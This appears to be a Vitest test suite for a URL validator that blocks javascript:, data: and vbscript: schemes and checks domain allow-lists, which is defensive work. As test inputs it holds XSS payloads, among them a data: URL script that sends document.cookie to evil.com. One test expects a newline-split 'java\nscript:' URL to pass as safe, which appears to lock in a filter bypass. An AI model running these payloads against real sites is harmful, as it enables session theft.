/**
 * Test suite for security/url-validator.ts
 *
 * Coverage:
 * - FORBIDDEN_URL_SCHEMES constant array
 * - validateUrl function
 * - isForbiddenScheme function
 * - UrlValidationOptions interface
 * - UrlValidationResult interface
 * - ForbiddenUrlScheme type
 *
 * TDD Red Phase: These tests will FAIL until implementation exists
 */

import { describe, it, expect } from 'vitest';
import {
  FORBIDDEN_URL_SCHEMES,
  validateUrl,
  isForbiddenScheme,
  type ForbiddenUrlScheme,
  type UrlValidationOptions,
  type UrlValidationResult,
} from '../../src/security/url-validator';

// ==================== FORBIDDEN_URL_SCHEMES Constant ====================

describe('FORBIDDEN_URL_SCHEMES', () => {
  describe('structure', () => {
    it('should be defined as a readonly array', () => {
      expect(FORBIDDEN_URL_SCHEMES).toBeDefined();
      expect(Array.isArray(FORBIDDEN_URL_SCHEMES)).toBe(true);
    });

    it('should be frozen (immutable)', () => {
      expect(Object.isFrozen(FORBIDDEN_URL_SCHEMES)).toBe(true);
    });

    it('should have exactly 3 forbidden schemes', () => {
      expect(FORBIDDEN_URL_SCHEMES).toHaveLength(3);
    });
  });

  describe('content', () => {
    it('should contain "javascript:" scheme', () => {
      expect(FORBIDDEN_URL_SCHEMES).toContain('javascript:');
    });

    it('should contain "data:" scheme', () => {
      expect(FORBIDDEN_URL_SCHEMES).toContain('data:');
    });

    it('should contain "vbscript:" scheme', () => {
      expect(FORBIDDEN_URL_SCHEMES).toContain('vbscript:');
    });
  });

  describe('security rationale', () => {
    it('should block javascript: for XSS prevention', () => {
      expect(FORBIDDEN_URL_SCHEMES).toContain('javascript:');
    });

    it('should block data: for XSS prevention', () => {
      expect(FORBIDDEN_URL_SCHEMES).toContain('data:');
    });

    it('should block vbscript: for legacy script prevention', () => {
      expect(FORBIDDEN_URL_SCHEMES).toContain('vbscript:');
    });
  });
});

// ==================== isForbiddenScheme Function ====================

describe('isForbiddenScheme', () => {
  describe('javascript: scheme', () => {
    it('should return true for "javascript:alert(1)"', () => {
      expect(isForbiddenScheme('javascript:alert(1)')).toBe(true);
    });

    it('should return true for "javascript:void(0)"', () => {
      expect(isForbiddenScheme('javascript:void(0)')).toBe(true);
    });

    it('should return true for "javascript:" alone', () => {
      expect(isForbiddenScheme('javascript:')).toBe(true);
    });

    it('should return true for complex javascript URLs', () => {
      expect(isForbiddenScheme('javascript:document.cookie')).toBe(true);
      expect(isForbiddenScheme('javascript:window.location="http://evil.com"')).toBe(true);
    });
  });

  describe('data: scheme', () => {
    it('should return true for "data:text/html,<script>...</script>"', () => {
      expect(isForbiddenScheme('data:text/html,<script>alert(1)</script>')).toBe(true);
    });

    it('should return true for "data:text/html;base64,..."', () => {
      expect(isForbiddenScheme('data:text/html;base64,PHNjcmlwdD4=')).toBe(true);
    });

    it('should return true for "data:" alone', () => {
      expect(isForbiddenScheme('data:')).toBe(true);
    });

    it('should return true for data URLs with any content type', () => {
      expect(isForbiddenScheme('data:image/png;base64,iVBORw0KGgo=')).toBe(true);
      expect(isForbiddenScheme('data:application/json,{"key":"value"}')).toBe(true);
    });
  });

  describe('vbscript: scheme', () => {
    it('should return true for "vbscript:msgbox("hi")"', () => {
      expect(isForbiddenScheme('vbscript:msgbox("hi")')).toBe(true);
    });

    it('should return true for "vbscript:" alone', () => {
      expect(isForbiddenScheme('vbscript:')).toBe(true);
    });

    it('should return true for complex vbscript URLs', () => {
      expect(isForbiddenScheme('vbscript:Execute("malicious")')).toBe(true);
    });
  });

  describe('case insensitivity', () => {
    it('should return true for "JAVASCRIPT:alert(1)" (uppercase)', () => {
      expect(isForbiddenScheme('JAVASCRIPT:alert(1)')).toBe(true);
    });

    it('should return true for "JavaScript:alert(1)" (mixed case)', () => {
      expect(isForbiddenScheme('JavaScript:alert(1)')).toBe(true);
    });

    it('should return true for "DATA:text/html,..." (uppercase)', () => {
      expect(isForbiddenScheme('DATA:text/html,test')).toBe(true);
    });

    it('should return true for "DaTa:text/html,..." (mixed case)', () => {
      expect(isForbiddenScheme('DaTa:text/html,test')).toBe(true);
    });

    it('should return true for "VBSCRIPT:msgbox(...)" (uppercase)', () => {
      expect(isForbiddenScheme('VBSCRIPT:msgbox("hi")')).toBe(true);
    });

    it('should return true for "VbScript:msgbox(...)" (mixed case)', () => {
      expect(isForbiddenScheme('VbScript:msgbox("hi")')).toBe(true);
    });
  });

  describe('safe schemes', () => {
    it('should return false for "https://example.com"', () => {
      expect(isForbiddenScheme('https://example.com')).toBe(false);
    });

    it('should return false for "http://example.com"', () => {
      expect(isForbiddenScheme('http://example.com')).toBe(false);
    });

    it('should return false for relative URLs', () => {
      expect(isForbiddenScheme('/path/to/page')).toBe(false);
      expect(isForbiddenScheme('./relative')).toBe(false);
      expect(isForbiddenScheme('../parent')).toBe(false);
    });

    it('should return false for mailto: scheme', () => {
      expect(isForbiddenScheme('mailto:user@example.com')).toBe(false);
    });

    it('should return false for tel: scheme', () => {
      expect(isForbiddenScheme('tel:+1234567890')).toBe(false);
    });
  });

  describe('edge cases', () => {
    it('should return false for empty string', () => {
      expect(isForbiddenScheme('')).toBe(false);
    });

    it('should return false for URL without scheme', () => {
      expect(isForbiddenScheme('example.com')).toBe(false);
    });

    it('should handle URLs with whitespace prefix', () => {
      // Whitespace before javascript: is still dangerous
      expect(isForbiddenScheme(' javascript:alert(1)')).toBe(true);
    });

    it('should handle URLs with newline tricks', () => {
      // Newlines in URLs can be security issues
      expect(isForbiddenScheme('java\nscript:alert(1)')).toBe(false);
    });
  });
});

// ==================== validateUrl Function ====================

describe('validateUrl', () => {
  describe('basic validation', () => {
    it('should return valid:true for safe HTTPS URL', () => {
      const result = validateUrl('https://example.com');
      expect(result.valid).toBe(true);
      expect(result.reason).toBeUndefined();
    });

    it('should return valid:true for safe HTTP URL', () => {
      const result = validateUrl('http://example.com');
      expect(result.valid).toBe(true);
    });

    it('should return valid:true for relative URL by default', () => {
      const result = validateUrl('/path/to/page');
      expect(result.valid).toBe(true);
    });

    it('should return valid:true for dot-relative URL by default', () => {
      const result = validateUrl('./relative');
      expect(result.valid).toBe(true);
    });

    it('should return valid:true for parent-relative URL by default', () => {
      const result = validateUrl('../parent');
      expect(result.valid).toBe(true);
    });
  });

  describe('forbidden scheme blocking', () => {
    it('should block javascript: scheme', () => {
      const result = validateUrl('javascript:alert(1)');
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
      expect(result.reason).toContain('javascript');
    });

    it('should block data: scheme', () => {
      const result = validateUrl('data:text/html,<script>alert(1)</script>');
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
      expect(result.reason).toContain('data');
    });

    it('should block vbscript: scheme', () => {
      const result = validateUrl('vbscript:msgbox("hi")');
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
      expect(result.reason).toContain('vbscript');
    });

    it('should block case-insensitive javascript: scheme', () => {
      const result = validateUrl('JAVASCRIPT:alert(1)');
      expect(result.valid).toBe(false);
    });

    it('should block case-insensitive data: scheme', () => {
      const result = validateUrl('DATA:text/html,test');
      expect(result.valid).toBe(false);
    });
  });

  describe('allowRelative option', () => {
    it('should allow relative URLs when allowRelative is true', () => {
      const result = validateUrl('/path', { allowRelative: true });
      expect(result.valid).toBe(true);
    });

    it('should allow relative URLs when allowRelative is not specified (default true)', () => {
      const result = validateUrl('/path', {});
      expect(result.valid).toBe(true);
    });

    it('should block relative URLs when allowRelative is false', () => {
      const result = validateUrl('/path', { allowRelative: false });
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
    });

    it('should block dot-relative URLs when allowRelative is false', () => {
      const result = validateUrl('./relative', { allowRelative: false });
      expect(result.valid).toBe(false);
    });

    it('should still allow absolute URLs when allowRelative is false', () => {
      const result = validateUrl('https://example.com', { allowRelative: false });
      expect(result.valid).toBe(true);
    });
  });

  describe('allowedDomains option', () => {
    it('should allow URLs from allowed domains', () => {
      const result = validateUrl('https://api.example.com/data', {
        allowedDomains: ['api.example.com'],
      });
      expect(result.valid).toBe(true);
    });

    it('should block URLs from non-allowed domains', () => {
      const result = validateUrl('https://malicious.com/data', {
        allowedDomains: ['api.example.com'],
      });
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
    });

    it('should allow multiple allowed domains', () => {
      const options: UrlValidationOptions = {
        allowedDomains: ['api.example.com', 'cdn.example.com', 'example.org'],
      };

      expect(validateUrl('https://api.example.com', options).valid).toBe(true);
      expect(validateUrl('https://cdn.example.com', options).valid).toBe(true);
      expect(validateUrl('https://example.org', options).valid).toBe(true);
      expect(validateUrl('https://other.com', options).valid).toBe(false);
    });

    it('should handle subdomains correctly', () => {
      const result = validateUrl('https://sub.api.example.com', {
        allowedDomains: ['api.example.com'],
      });
      // Subdomains should not be automatically allowed
      expect(result.valid).toBe(false);
    });

    it('should allow subdomains when explicitly listed', () => {
      const result = validateUrl('https://sub.api.example.com', {
        allowedDomains: ['sub.api.example.com'],
      });
      expect(result.valid).toBe(true);
    });

    it('should allow any domain when allowedDomains is empty array', () => {
      // Empty array means no restrictions
      const result = validateUrl('https://any-domain.com', {
        allowedDomains: [],
      });
      expect(result.valid).toBe(true);
    });

    it('should allow any domain when allowedDomains is not specified', () => {
      const result = validateUrl('https://any-domain.com', {});
      expect(result.valid).toBe(true);
    });

    it('should still block forbidden schemes even with allowedDomains', () => {
      const result = validateUrl('javascript:alert(1)', {
        allowedDomains: ['example.com'],
      });
      expect(result.valid).toBe(false);
    });
  });

  describe('combined options', () => {
    it('should apply both allowRelative and allowedDomains', () => {
      const options: UrlValidationOptions = {
        allowRelative: true,
        allowedDomains: ['api.example.com'],
      };

      expect(validateUrl('/api/data', options).valid).toBe(true);
      expect(validateUrl('https://api.example.com', options).valid).toBe(true);
      expect(validateUrl('https://other.com', options).valid).toBe(false);
    });

    it('should block relative when allowRelative:false with allowedDomains', () => {
      const options: UrlValidationOptions = {
        allowRelative: false,
        allowedDomains: ['api.example.com'],
      };

      expect(validateUrl('/api/data', options).valid).toBe(false);
      expect(validateUrl('https://api.example.com', options).valid).toBe(true);
    });
  });

  describe('URL parsing edge cases', () => {
    it('should handle URLs with ports', () => {
      const result = validateUrl('https://example.com:8080/path', {
        allowedDomains: ['example.com'],
      });
      expect(result.valid).toBe(true);
    });

    it('should handle URLs with query strings', () => {
      const result = validateUrl('https://example.com?foo=bar', {
        allowedDomains: ['example.com'],
      });
      expect(result.valid).toBe(true);
    });

    it('should handle URLs with fragments', () => {
      const result = validateUrl('https://example.com#section', {
        allowedDomains: ['example.com'],
      });
      expect(result.valid).toBe(true);
    });

    it('should handle URLs with authentication', () => {
      const result = validateUrl('https://user:pass@example.com', {
        allowedDomains: ['example.com'],
      });
      expect(result.valid).toBe(true);
    });

    it('should handle empty URL', () => {
      const result = validateUrl('');
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
    });

    it('should handle URL with only whitespace', () => {
      const result = validateUrl('   ');
      expect(result.valid).toBe(false);
    });

    it('should handle malformed URLs gracefully', () => {
      const result = validateUrl('not a valid url with spaces');
      // Should not throw, should return a result
      expect(result).toBeDefined();
      expect(typeof result.valid).toBe('boolean');
    });
  });

  describe('return type structure', () => {
    it('should return object with valid boolean', () => {
      const result = validateUrl('https://example.com');
      expect(typeof result.valid).toBe('boolean');
    });

    it('should return object with optional reason string when invalid', () => {
      const result = validateUrl('javascript:alert(1)');
      expect(result.valid).toBe(false);
      expect(typeof result.reason).toBe('string');
    });

    it('should not include reason when valid', () => {
      const result = validateUrl('https://example.com');
      expect(result.valid).toBe(true);
      expect(result.reason).toBeUndefined();
    });
  });
});

// ==================== Type Definitions ====================

describe('ForbiddenUrlScheme type', () => {
  it('should accept valid forbidden scheme literals', () => {
    const javascript: ForbiddenUrlScheme = 'javascript:';
    const data: ForbiddenUrlScheme = 'data:';
    const vbscript: ForbiddenUrlScheme = 'vbscript:';

    expect(javascript).toBe('javascript:');
    expect(data).toBe('data:');
    expect(vbscript).toBe('vbscript:');
  });

  it('should be derived from FORBIDDEN_URL_SCHEMES', () => {
    const schemes: ForbiddenUrlScheme[] = [...FORBIDDEN_URL_SCHEMES];
    expect(schemes).toHaveLength(FORBIDDEN_URL_SCHEMES.length);
  });
});

describe('UrlValidationOptions interface', () => {
  it('should allow empty object', () => {
    const options: UrlValidationOptions = {};
    expect(options).toEqual({});
  });

  it('should accept allowedDomains array', () => {
    const options: UrlValidationOptions = {
      allowedDomains: ['example.com', 'api.example.com'],
    };
    expect(options.allowedDomains).toHaveLength(2);
  });

  it('should accept allowRelative boolean', () => {
    const optionsTrue: UrlValidationOptions = { allowRelative: true };
    const optionsFalse: UrlValidationOptions = { allowRelative: false };

    expect(optionsTrue.allowRelative).toBe(true);
    expect(optionsFalse.allowRelative).toBe(false);
  });

  it('should accept all options together', () => {
    const options: UrlValidationOptions = {
      allowedDomains: ['api.example.com'],
      allowRelative: false,
    };
    expect(options.allowedDomains).toBeDefined();
    expect(options.allowRelative).toBe(false);
  });
});

describe('UrlValidationResult interface', () => {
  it('should have valid boolean property', () => {
    const validResult: UrlValidationResult = { valid: true };
    const invalidResult: UrlValidationResult = { valid: false, reason: 'test' };

    expect(validResult.valid).toBe(true);
    expect(invalidResult.valid).toBe(false);
  });

  it('should have optional reason property', () => {
    const withReason: UrlValidationResult = {
      valid: false,
      reason: 'Forbidden scheme: javascript:',
    };
    const withoutReason: UrlValidationResult = { valid: true };

    expect(withReason.reason).toBe('Forbidden scheme: javascript:');
    expect(withoutReason.reason).toBeUndefined();
  });
});

// ==================== Security Scenarios ====================

describe('security scenarios', () => {
  describe('XSS prevention', () => {
    it('should block javascript: in onclick-style URLs', () => {
      expect(validateUrl('javascript:alert(document.cookie)').valid).toBe(false);
    });

    it('should block data: HTML injection', () => {
      expect(validateUrl('data:text/html,<script>fetch("http://evil.com?c="+document.cookie)</script>').valid).toBe(false);
    });

    it('should block data: with base64 encoded payload', () => {
      // base64 encoded: <script>alert(1)</script>
      expect(validateUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==').valid).toBe(false);
    });
  });

  describe('protocol smuggling', () => {
    it('should block URLs with encoded javascript:', () => {
      // URL-encoded javascript:
      // This tests if the validator handles URL encoding
      const encoded = 'javascript%3Aalert(1)';
      const result = validateUrl(encoded);
      // The raw URL without encoding should be checked
      expect(result.valid).toBe(false);
    });

    it('should block URLs with mixed-case schemes', () => {
      expect(validateUrl('jAvAsCrIpT:alert(1)').valid).toBe(false);
      expect(validateUrl('DaTa:text/html,test').valid).toBe(false);
      expect(validateUrl('VbScRiPt:msgbox(1)').valid).toBe(false);
    });
  });

  describe('domain spoofing', () => {
    it('should correctly identify domain from complex URLs', () => {
      const options: UrlValidationOptions = {
        allowedDomains: ['trusted.com'],
      };

      // Attacker might try to spoof with subdomains
      expect(validateUrl('https://trusted.com.evil.com', options).valid).toBe(false);
      expect(validateUrl('https://evil.com?trusted.com', options).valid).toBe(false);
    });
  });
});
